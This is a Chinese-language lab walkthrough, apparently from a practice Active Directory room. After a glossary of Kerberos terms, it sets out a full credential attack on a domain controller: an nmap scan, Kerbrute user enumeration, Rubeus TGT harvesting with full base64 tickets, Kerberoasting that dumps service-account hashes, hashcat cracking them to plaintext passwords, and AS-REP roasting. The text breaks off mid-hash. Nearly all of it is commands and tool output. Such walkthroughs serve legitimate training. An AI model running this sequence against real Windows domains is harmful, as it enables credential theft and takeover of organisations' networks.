# 常用术语 -  

票证授予票证 (TGT) - 票证授予票证是一种身份验证票证，用于从 TGS 为域中的特定资源请求服务票证。
密钥分发中心 (KDC) - 密钥分发中心是一种用于发布 TGT 和服务票据的服务，由身份验证服务和票据授予服务组成。
身份验证服务(AS) - 身份验证服务发布 TGT 供域中的 TGS 使用， 以请求访问其他机器和服务票证。
票证授予服务 (TGS) - 票证授予服务获取 TGT 并将票证返回到域中的机器。
服务主体名称 (SPN) - 服务主体名称是提供给服务实例的标识符，用于将服务实例与域服务帐户相关联。Windows 要求服务具有域服务帐户，这就是服务需要 SPN 集的原因。
KDC 长期密钥（KDC LT 密钥）  - KDC 密钥基于 KRBTGT 服务帐户。它用于加密 TGT 并签署 PAC。
客户端长期密钥（Client LT Key）  - 客户端密钥基于计算机或服务帐户。它用于检查加密的时间戳和加密会话密钥。
服务长期密钥（Service LT Key）  ——服务密钥基于服务账户。它用于加密服务票据的服务部分并签署 PAC。
会话密钥- 在发出 TGT 时由 KDC 发出。在请求服务票证时，用户将把会话密钥和 TGT 一起提供给 KDC。
特权属性证书 (PAC) - PAC 持有用户的所有相关信息，它与 TGT 一起发送到 KDC，由目标 LT 密钥和 KDC LT 密钥签名以验证用户。

# nmap 探测
└─#  nmap -sV 10.10.40.75  
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-20 02:07 EDT
Nmap scan report for 10.10.40.75
Host is up (0.31s latency).
Not shown: 987 closed ports
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-08-20 06:07:32Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: CONTROLLER.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: CONTROLLER.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: Host: CONTROLLER-1; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.02 seconds

# Kerbrute枚举用户名
└─#  ./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local user.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 08/20/21 - Ronnie Flathers @ropnop

2021/08/20 02:12:09 >  Using KDC(s):
2021/08/20 02:12:09 >   CONTROLLER.local:88

2021/08/20 02:12:10 >  [+] VALID USERNAME:       admin1@CONTROLLER.local
2021/08/20 02:12:10 >  [+] VALID USERNAME:       admin2@CONTROLLER.local
2021/08/20 02:12:10 >  [+] VALID USERNAME:       administrator@CONTROLLER.local
2021/08/20 02:12:13 >  [+] VALID USERNAME:       httpservice@CONTROLLER.local
2021/08/20 02:12:13 >  [+] VALID USERNAME:       machine1@CONTROLLER.local
2021/08/20 02:12:13 >  [+] VALID USERNAME:       sqlservice@CONTROLLER.local
2021/08/20 02:12:13 >  [+] VALID USERNAME:       machine2@CONTROLLER.local
2021/08/20 02:12:13 >  [+] VALID USERNAME:       user1@CONTROLLER.local
2021/08/20 02:12:13 >  [+] VALID USERNAME:       user2@CONTROLLER.local
2021/08/20 02:12:13 >  [+] VALID USERNAME:       user3@CONTROLLER.local
2021/08/20 02:12:15 >  Done! Tested 100 usernames (10 valid) in 5.956 seconds



# 告诉 Rubeus 每 30 秒收获一次 TGT 
Rubeus.exe harvest /interval:30


______        _                       
  (_____ \      | |                      
   _____) )_   _| |__  _____ _   _  ___  
  |  __  /| | | |  _ \| ___ | | | |/___) 
  | |  \ \| |_| | |_) ) ____| |_| |___ | 
  |_|   |_|____/|____/|_____)____/(___/  
                                         
  v1.5.0                                 

[*] Action: TGT Harvesting (with auto-renewal) 
[*] Monitoring every 30 seconds for new TGTs
[*] Displaying the working TGT cache every 30 seconds


[*] Refreshing TGT ticket cache (8/19/2021 11:27:08 PM)

  User                  :  CONTROLLER-1$@CONTROLLER.LOCAL 
  StartTime             :  8/19/2021 10:51:35 PM
  EndTime               :  8/20/2021 8:51:35 AM
  RenewTill             :  8/26/2021 10:51:35 PM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

    doIFhDCCBYCgAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr 
    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQoMIIEJKADAgESoQMCAQKiggQWBIIEEpGyurj92motcY4kQ4ZNbSrha+Mh+JoXaixA
    s/LsmlcmWqIWTiOl57SJVk+gcnHj19KmhQnfJbxxWrdckqWVEuNOJS7WBvPZ+t0PQBfqRvttcpedjmJSE8NjnXM/+LESUOrG25jk
    7mMII9wo6iW5Bk+S7X+FyyMw4SZeI+O1ei8dIr6RynmDc0kTNwHFjjI78lvNRA6GLvORniusUqm461oCoYkGCxA+hXWXpaXk/0Ge
    CRTBe/p5o93ubSH65B/xJO0ju/XcxDL7E8Ts01HwvC/2S6b7H36gGnbMN8pts7RP9vV8BUxwu9oZkN6dJpNhVthLJgyCLUHDzFnX
    J7UJzvxa4DnL2aqR+mDos4iGxM8XS12iX/m+VH1Ba0iRJkq2hJHOtT6Pyimw4tP/5yPAjv0CwVq+ddwpwVA9Z1glPLfId/QpLTx+
    hllcsirB06lWKXxRMlPG59bTTt++O/tjG6GW7MAVzitSxYx2QCF886JywCK1Oy74aLkUc6NiPMajdndqJ16h3pQMrh6Y713qorRz
    dZc/oWmWuhQPOq49dfVi9Mso+Krfap304xqhtQOchyqKe5PF0Bv2A6zHRWEq85DxUd+BN+1z5rz09zSWQOKt5d31UgXlshHQyAVg
    XnB+7P3tpxt4bZ1l4LFgUoYs82EIWgM+Kwa9F8LA1JLWOy51tWsYPoF8IKcyR0nR8b+ZZkeda45MbyTTu8EloU+MHwDcuXqOAiZq
    Gcbv/rog/eolrkGX0Wh7ZbnyRdCoJdoxqJbT7X/rYKaO8tzrftXAPi0J3AGROQFUo5RdMD2ZFBVdHkQADS3U9Un8W0OfIat7AHuU
    Oc4YgeNcalmMBSUxy7G4AE2XhuVC81+OHK81yYVRbxKn5aVpEsGcir7qRohzV6qdXENyLeZnK8Amo31wlTk4PERCVmjJ9OPKmDju
    XYoHeZPEGPn2kyPi33eEhsFwBevQuv0Pw7+20NRdOI7T701UT7BVJRiOTi4t/iVlsp5DYr7fUQu3Ie3rTstYW/AZj4iJeT4MhFnZ
    DUrEMX120O6QNx31OvOvMi33xmKefBuW+RKup3dgSxMsIvMZhZgPfxWX2obfqwYwb/0wIPZCUf3ot7o6Tt9CbuVGX3vG0VaCloC6
    db2e3vQ+6XUcAkwz4xbIkSKQ26wVCYxhag0asEh3yjjbB67X/m/EVUg+0OiCa2e7XghAH9XKKNtLHX+3g6AxDFOEjResDoHpwV4d
    1wUIqWrxManPtw2Nk3DKZCCeqs5MoSKpZ4fLnWK0ah8vfH2RHIu3pwihlW4uEurtYNiBkMDL0MyiR6e2UsyP0b+BR9V2Zmgt8Rc0
    LjwxtzgSnAV+CKCP6FQA+AKFJvvTdh3jv3IJ995nihKJxTw0FbA25ISjgfcwgfSgAwIBAKKB7ASB6X2B5jCB46CB4DCB3TCB2qAr
    MCmgAwIBEqEiBCCmJHJSDygxVxYp9UfRxY0xzlvfraJqhhi6bUBfZqW5bKESGxBDT05UUk9MTEVSLkxPQ0FMohowGKADAgEBoREw
    DxsNQ09OVFJPTExFUi0xJKMHAwUAQOEAAKURGA8yMDIxMDgyMDA1NTEzNVqmERgPMjAyMTA4MjAxNTUxMzVapxEYDzIwMjEwODI3
    MDU1MTM1WqgSGxBDT05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLkxPQ0FM

  User                  :  Administrator@CONTROLLER.LOCAL
  StartTime             :  8/19/2021 11:19:30 PM
  EndTime               :  8/20/2021 9:19:30 AM
  RenewTill             :  8/26/2021 11:19:30 PM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

    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


    controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>Rubeus.exe kerberoast




# 用Kerberos dump kerberoastable users   的hash
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/
 
  v1.5.0


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts. 
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts. 

[*] Searching the current domain for Kerberoastable users

[*] Total kerberoastable users : 2


[*] SamAccountName         : SQLService
[*] DistinguishedName      : CN=SQLService,CN=Users,DC=CONTROLLER,DC=local
[*] ServicePrincipalName   : CONTROLLER-1/SQLService.CONTROLLER.local:30111
[*] PwdLastSet             : 5/25/2020 10:28:26 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*SQLService$CONTROLLER.local$CONTROLLER-1/SQLService.CONTROLLER.loca 
                             l:30111*$AC5340C0373A7CAAF9D0E9DA4169C9C4$710E118AD242249A9C806D67892AEF5D35C3F0 
                             13A5DB6E6619CC0C507397A5134893724D9B50560D300234389B4324D19BDB19EB60F21D0DD7DA2D
                             F4FD70246530189C196170A444FC548B631DB91FCE44F3472E94E4C4DE85694EF86DE3C2E79F6C07
                             6792AB6E3FB19ABF3ACCC75464616E3BB06E6BF97B14FBB0329AAB01D89ACFA307A35F6252B8D6A3
                             27747D121007147949156E46241B67BC45830ADA6D341970502F6558A8B06F0372DF17628D8DDAC3
                             5BBDECD32B03400B8B5E7D95BDE9E3F8E8807B7E0CAD5BBE0E21BF6D073BBD2E9E7434323DB53CD9
                             F68119539F180DA4B8077EF7F6A7A43BC37011BC555837B567ADFFEF490D4521C02477B14744BC8E
                             12C7751FD1C9C7D31402E70D07F698128B2CCEEE9B131D43FD8C9B8B05D4B47A90E8EEA86DD9B1C0
                             F0376FB2D0A72CAD34BE01417272A7E975F1BA85F994163F486F50685327493ADE6ED9E12CC51B5A
                             103834AD956D27468C518E5E0054D919CC5CB4D9268F69F0B4885878E5612C5E3DF895130DA887ED
                             1A41D1CCDEC168D21E8A2E3D662FBFC5343D67706BFFABE7A79FE2B79341E5A7C3C41A737213F561
                             6AD3E4A7289D19241B70FC5399F80858770D04C1B401F9858E48C1F4626B4819E55D7F6BB5736305
                             E21FF6093B03AEDAC950F46A8705465E8E703F975EB745F69F04F488B9438B9163E0FF96C158E2EF
                             3D6B7F942509E1E545F4608E4B5BEB28C7255B34D545CB37908B6D17F2B0151D4C1385C75C35A8EF
                             58E6D176E412F1854F1267284CC4A2211F91565BEC62FB5006FDF56474E4CA1A72A9D2675A755CEF
                             4D7558DEAC6095FF68905E566C3F6A18E9B94294A2B9453F3A7D480A7360634797DBD8A23464646E
                             CB5E3DF534B9E2D20A448F02DB2E1081569FF2655BB1F3B38705F094172A51286C3AA79BFA58EFE7
                             E480BCD5BBA722FCD743E3CDD686D63BFE88A79899BDA670584A4AFF6AD3AC226F0FBA171E69115A
                             18816F82F16EC01F3020DB112B9ED68DA88F29D3432F1043FE4A8E5312476700FB4FD8618E161E26
                             669E32716530824A6ED345185646FBCE6904F58D68AC872924E37F870E1F820DD3D4FEC62790D961
                             BC07AF93165A128C7753BCD7079B2C45A231C753ABA41F53E84CC010E11F9078E16C8A37B05D180B
                             FAB730DA1A0E057A3E9E0AAA8CC959AF38D62DCA1966BDE480FD349B7C9660E9F374A2962AD3DF28
                             E1A30BAB2CF5D9B71B21429E5703F837F871298165A310B1D3B981BEF6033F624D601EC43ED5EF2C
                             0595D518FB8404255375695CD50BC791EA7916F03EBF8BADEBE2F2FB0DC4E10DD39EC573B603FA54
                             C41B52AC69D2B7EA74C13475C46F950B0726C74A33F9788FD0A8184EFD2812CC14D228F88693C4EB
                             0DE9437CF552FEEADDB02644EAB5E0171B57503CA7C9FF3FD4A82A9653192D08625572BC2D5348D6
                             22296A20E8FB419F64AC1CB8FDDBEC63DB5460A4EF150ECEF6379F05CD68367BA9E96151CC3C2867
                             1CAF2B4B8A17890B0861D0837A1B7FDEC4264648A5A47D1C4E3273A4C2C98EE72FCFC2C89EB87D31
                             8D8DEE93D3402A9BBB641D8FE94E929A8808A5CD60D8FF27B97E316187C9272FE3C515CA7580D858
                             51F8DF912E60D481B78E42932EBA068988DC22B702C82CB178B4F10308


[*] SamAccountName         : HTTPService
[*] DistinguishedName      : CN=HTTPService,CN=Users,DC=CONTROLLER,DC=local
[*] ServicePrincipalName   : CONTROLLER-1/HTTPService.CONTROLLER.local:30222
[*] PwdLastSet             : 5/25/2020 10:39:17 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*HTTPService$CONTROLLER.local$CONTROLLER-1/HTTPService.CONTROLLER.lo
                             cal:30222*$28A24627A44783BCB7A035D61A1568F3$E81005153B3E706F35E321D9FA331CCBFF96
                             A64CE06D1AFD97A7A554FBBE9F6AD18EEBFEE7207F6BD93BA2921F18B5370DF3AB58752AC8F15A2B
                             67FE0389C5108084C2EC19CE7736FF64FC949E3CA6A8E590D56D67149E46FB090B73B15CD3A389EE
                             A45FEB45D233BA0F845873ED744AA2A51388BAC21F6419D2B58902DE459C4BD914E0FA676885180F
                             CB09A6402A3E0804CD4ECCE16458C9CFA8DDAE917F18BD799522AFBFA275E3BA65DEBD7CA38680CB
                             C03B7D74110C98B2947293169D8A435C0CCD213EB7963480D5A52FBA374494FEB84DC5FCBB6125A3
                             CFAFFBD69F6E41C0C3E593A4B9342A4260843B7EF5A317EE9F75D86357A3844D9A5A1D57FF772281
                             095D6467EFCBD5564C244AE48C7C9CFCF5A267D82B8215977B57955FAE795A7FC7E1EF3E34FB472E
                             A415763B5FCDB2C65B0AC2DEC43139ABFB130D26BBD29719414321BAF2CDB38DA1E6A1B8087B19C6
                             5C3496C216F6E88D5F5F63C1C6482EBAF7C76CA9E904DE290424B99FFF4E1873340783CF3324CFFB
                             621B4EC0E3E325A4B8F14808027D82E1F0EB349857079BA49F79E1AA9688E7EB849DB663A691A522
                             AB7D0F9593BA3198251C6C1471BFC74F3614CAF3F6B694D4C144D5E1B75140890E16B1E62149A5F7
                             EF61F8CEE508948A9B67494CBE3000D242E7C1898C33CA5860293F28E61E8AD893381C4C90B74B4D
                             6136898DB5D5C8CF0CA842B146F1AF99AF14C83DFA8303495DDD204FD5CA1E3E3C61B2CD5FE46C8C
                             7AE88BD45E28DEA4FEE6055B953F098313276874A671CAA983E11E44650C2E4AAFA2D33C8116A820
                             FCA08793676E1EDB5D72AD164F788A497BD8B97EEC14C89A372280F517A31B7489E352F4AC985AF2
                             161C1F3770E771023C994DB64C1EEA24A89AAE64E6E34552BFDC6464E2B2A7812090A09DD3CE49D0
                             6F0327CE088E9D64DD5764D6B7E3C2053698687EA98CD420816356FBE467E59462924E8FCC4A6391
                             1E2CBE55D6766F25B5A2AA723C2B0A507A76D2DEAA4E7913DE2556FC11632D8BF2B45C5742E7D6FB
                             42454EA2AFC696DDCF2089041252126390B9BB6F80E367D81BE682D1F397FCF2BDAA46C44F64AD37
                             35637A9C69185090870FB1FAF6835D57FD61EAF14C6C6261CED1A91749CECFBD1D72C3372D83FE71
                             1FA230CCDDE81D2098AB24369276E7684A7753F10F165F52537A9B5889483ECA4AF143C8C8EDC167
                             E8383739BAFF3B95E6954F05AE4006A22AE689D1BDADAB99BC4A41901D4751BE3FA8011F8706328A
                             6181A8D589D770E9522F0A13F490AE3DE7FF7236FB4FAA85D733C92CC26096B771E36556A5437423
                             C33FB98DBE936AC90F4467E68BA8F01585DC102C394DC4E03B0340ACC2D0B9B2C715B37EF75DE574
                             737C75CA6929101C3722F6ED09BDF7226E846BED3D76B41A7F9A0D3EDB3869AFC265EE234E5F3137
                             4EAA75A8442725C04DDEDA916559A1624F70E32E4E9DC800B4E2A0E63E699ECB15B63FCD3123E669
                             A8D0A29B188245B5905E2C578048ECA9168313760700D2A898BB7E8040F3605C95789E4A819A3C86
                             CD375F9E6CA615E5EE1E12E5FF863BB3EA638494F7A7047B9D6F5391D79314A15CE38B869E0BC6F2
                             5C575532ED5C913579FD2AAF4D83213FB98D11C45E36D35CB851683CCA48


# 暴力破解hash，把上面两个hash值整理到hash.txt里
$krb5tgs$23$*SQLService$CONTROLLER.local$CONTROLLER-1/SQLService.CONTROLLER.local:30111*$AC5340C0373A7CAAF9D0E9DA4169C9C4$710E118AD242249A9C806D67892AEF5D35C3F013A5DB6E6619CC0C507397A5134893724D9B50560D300234389B4324D19BDB19EB60F21D0DD7DA2DF4FD70246530189C196170A444FC548B631DB91FCE44F3472E94E4C4DE85694EF86DE3C2E79F6C076792AB6E3FB19ABF3ACCC75464616E3BB06E6BF97B14FBB0329AAB01D89ACFA307A35F6252B8D6A327747D121007147949156E46241B67BC45830ADA6D341970502F6558A8B06F0372DF17628D8DDAC35BBDECD32B03400B8B5E7D95BDE9E3F8E8807B7E0CAD5BBE0E21BF6D073BBD2E9E7434323DB53CD9F68119539F180DA4B8077EF7F6A7A43BC37011BC555837B567ADFFEF490D4521C02477B14744BC8E12C7751FD1C9C7D31402E70D07F698128B2CCEEE9B131D43FD8C9B8B05D4B47A90E8EEA86DD9B1C0F0376FB2D0A72CAD34BE01417272A7E975F1BA85F994163F486F50685327493ADE6ED9E12CC51B5A103834AD956D27468C518E5E0054D919CC5CB4D9268F69F0B4885878E5612C5E3DF895130DA887ED1A41D1CCDEC168D21E8A2E3D662FBFC5343D67706BFFABE7A79FE2B79341E5A7C3C41A737213F5616AD3E4A7289D19241B70FC5399F80858770D04C1B401F9858E48C1F4626B4819E55D7F6BB5736305E21FF6093B03AEDAC950F46A8705465E8E703F975EB745F69F04F488B9438B9163E0FF96C158E2EF3D6B7F942509E1E545F4608E4B5BEB28C7255B34D545CB37908B6D17F2B0151D4C1385C75C35A8EF58E6D176E412F1854F1267284CC4A2211F91565BEC62FB5006FDF56474E4CA1A72A9D2675A755CEF4D7558DEAC6095FF68905E566C3F6A18E9B94294A2B9453F3A7D480A7360634797DBD8A23464646ECB5E3DF534B9E2D20A448F02DB2E1081569FF2655BB1F3B38705F094172A51286C3AA79BFA58EFE7E480BCD5BBA722FCD743E3CDD686D63BFE88A79899BDA670584A4AFF6AD3AC226F0FBA171E69115A18816F82F16EC01F3020DB112B9ED68DA88F29D3432F1043FE4A8E5312476700FB4FD8618E161E26669E32716530824A6ED345185646FBCE6904F58D68AC872924E37F870E1F820DD3D4FEC62790D961BC07AF93165A128C7753BCD7079B2C45A231C753ABA41F53E84CC010E11F9078E16C8A37B05D180BFAB730DA1A0E057A3E9E0AAA8CC959AF38D62DCA1966BDE480FD349B7C9660E9F374A2962AD3DF28E1A30BAB2CF5D9B71B21429E5703F837F871298165A310B1D3B981BEF6033F624D601EC43ED5EF2C0595D518FB8404255375695CD50BC791EA7916F03EBF8BADEBE2F2FB0DC4E10DD39EC573B603FA54C41B52AC69D2B7EA74C13475C46F950B0726C74A33F9788FD0A8184EFD2812CC14D228F88693C4EB0DE9437CF552FEEADDB02644EAB5E0171B57503CA7C9FF3FD4A82A9653192D08625572BC2D5348D622296A20E8FB419F64AC1CB8FDDBEC63DB5460A4EF150ECEF6379F05CD68367BA9E96151CC3C28671CAF2B4B8A17890B0861D0837A1B7FDEC4264648A5A47D1C4E3273A4C2C98EE72FCFC2C89EB87D318D8DEE93D3402A9BBB641D8FE94E929A8808A5CD60D8FF27B97E316187C9272FE3C515CA7580D85851F8DF912E60D481B78E42932EBA068988DC22B702C82CB178B4F10308




$krb5tgs$23$*HTTPService$CONTROLLER.local$CONTROLLER-1/HTTPService.CONTROLLER.local:30222*$28A24627A44783BCB7A035D61A1568F3$E81005153B3E706F35E321D9FA331CCBFF96A64CE06D1AFD97A7A554FBBE9F6AD18EEBFEE7207F6BD93BA2921F18B5370DF3AB58752AC8F15A2B67FE0389C5108084C2EC19CE7736FF64FC949E3CA6A8E590D56D67149E46FB090B73B15CD3A389EEA45FEB45D233BA0F845873ED744AA2A51388BAC21F6419D2B58902DE459C4BD914E0FA676885180FCB09A6402A3E0804CD4ECCE16458C9CFA8DDAE917F18BD799522AFBFA275E3BA65DEBD7CA38680CBC03B7D74110C98B2947293169D8A435C0CCD213EB7963480D5A52FBA374494FEB84DC5FCBB6125A3CFAFFBD69F6E41C0C3E593A4B9342A4260843B7EF5A317EE9F75D86357A3844D9A5A1D57FF772281095D6467EFCBD5564C244AE48C7C9CFCF5A267D82B8215977B57955FAE795A7FC7E1EF3E34FB472EA415763B5FCDB2C65B0AC2DEC43139ABFB130D26BBD29719414321BAF2CDB38DA1E6A1B8087B19C65C3496C216F6E88D5F5F63C1C6482EBAF7C76CA9E904DE290424B99FFF4E1873340783CF3324CFFB621B4EC0E3E325A4B8F14808027D82E1F0EB349857079BA49F79E1AA9688E7EB849DB663A691A522AB7D0F9593BA3198251C6C1471BFC74F3614CAF3F6B694D4C144D5E1B75140890E16B1E62149A5F7EF61F8CEE508948A9B67494CBE3000D242E7C1898C33CA5860293F28E61E8AD893381C4C90B74B4D6136898DB5D5C8CF0CA842B146F1AF99AF14C83DFA8303495DDD204FD5CA1E3E3C61B2CD5FE46C8C7AE88BD45E28DEA4FEE6055B953F098313276874A671CAA983E11E44650C2E4AAFA2D33C8116A820FCA08793676E1EDB5D72AD164F788A497BD8B97EEC14C89A372280F517A31B7489E352F4AC985AF2161C1F3770E771023C994DB64C1EEA24A89AAE64E6E34552BFDC6464E2B2A7812090A09DD3CE49D06F0327CE088E9D64DD5764D6B7E3C2053698687EA98CD420816356FBE467E59462924E8FCC4A63911E2CBE55D6766F25B5A2AA723C2B0A507A76D2DEAA4E7913DE2556FC11632D8BF2B45C5742E7D6FB42454EA2AFC696DDCF2089041252126390B9BB6F80E367D81BE682D1F397FCF2BDAA46C44F64AD3735637A9C69185090870FB1FAF6835D57FD61EAF14C6C6261CED1A91749CECFBD1D72C3372D83FE711FA230CCDDE81D2098AB24369276E7684A7753F10F165F52537A9B5889483ECA4AF143C8C8EDC167E8383739BAFF3B95E6954F05AE4006A22AE689D1BDADAB99BC4A41901D4751BE3FA8011F8706328A6181A8D589D770E9522F0A13F490AE3DE7FF7236FB4FAA85D733C92CC26096B771E36556A5437423C33FB98DBE936AC90F4467E68BA8F01585DC102C394DC4E03B0340ACC2D0B9B2C715B37EF75DE574737C75CA6929101C3722F6ED09BDF7226E846BED3D76B41A7F9A0D3EDB3869AFC265EE234E5F31374EAA75A8442725C04DDEDA916559A1624F70E32E4E9DC800B4E2A0E63E699ECB15B63FCD3123E669A8D0A29B188245B5905E2C578048ECA9168313760700D2A898BB7E8040F3605C95789E4A819A3C86CD375F9E6CA615E5EE1E12E5FF863BB3EA638494F7A7047B9D6F5391D79314A15CE38B869E0BC6F25C575532ED5C913579FD2AAF4D83213FB98D11C45E36D35CB851683CCA48

# 破解1
hashcat -m 13100 -a 0 hash.txt pass.txt   
密码：MYPassword123# 


# 破解2
hashcat -m 13100 -a 0 hash2.txt pass.txt
密码：Summer2020



# 运行 AS-REP 烘焙命令寻找易受攻击的用户，然后转储发现易受攻击的用户哈希
controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>Rubeus.exe asreproast

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0


[*] Action: AS-REP roasting

[*] Target Domain          : CONTROLLER.local

[*] Searching path 'LDAP://CONTROLLER-1.CONTROLLER.local/DC=CONTROLLER,DC=local' for AS-REP roastable users
[*] SamAccountName         : Admin2
[*] DistinguishedName      : CN=Admin-2,CN=Users,DC=CONTROLLER,DC=local
[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::14be:2bea:7aba:13ba%5)
[*] Building AS-REQ (w/o preauth) for: 'CONTROLLER.local\Admin2'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$Admin2@CONTROLLER.local:6A2760CC8B06C463B9B10F4A59BBED69$6524BF9E91A3
      7BE278E0A98DFF812ED5CFA07CF26CF25ECA5C5735FEC8B5EC2371164329EA5529988B76E35284C1
      1DB0A8B8E4CA574908E7E724CA980E0C96FD8A80B87D0D22B49C255E49D6E9A7FF7672D3FBA6736E
      F491B231B18E98ECD4B3712AF950C39BBEDE40CC9C88172F80A038C176A5C44A82F4639C7F95AB1F
      92F40114C3ED4D5D3109652A09C1DCC95672F785F94033A404D3E39BF1F44C39BF6FF16605052E62
      93ABB5DFBBA9A44A352CC4FE447A3CF73B5D17D8872848429EA1E99A9543E4C0603C2F0A4FE30E18
      B64DE7E613CD9944EE2D834AF78BBC64993C8FEEACBB5F75399D699F7489BE829B3246277656

[*] SamAccountName         : User3
[*] DistinguishedName      : CN=User-3,CN=Users,DC=CONTROLLER,DC=local
[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::14be:2bea:7aba:13ba%5)
[*] Building AS-REQ (w/o preauth) for: 'CONTROLLER.local\User3'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$User3@CONTROLLER.local:624083767E314BB9956FFED0AF7F3CB9$33D6C03F601A4
